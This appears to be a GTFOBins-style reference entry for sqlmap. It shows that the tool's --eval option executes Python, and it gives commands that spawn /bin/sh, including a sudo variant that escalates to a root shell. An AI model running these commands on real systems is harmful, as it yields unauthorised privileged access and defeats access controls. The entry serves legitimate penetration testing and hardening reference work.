---
description: This allows to execute [`python`](/gtfobins/python/) code, other functions may apply.
functions:
  shell:
    - code: sqlmap -u 127.0.0.1 --eval="import os; os.system('/bin/sh')"
  sudo:
    - code: sudo sqlmap -u 127.0.0.1 --eval="import os; os.system('/bin/sh')"
---
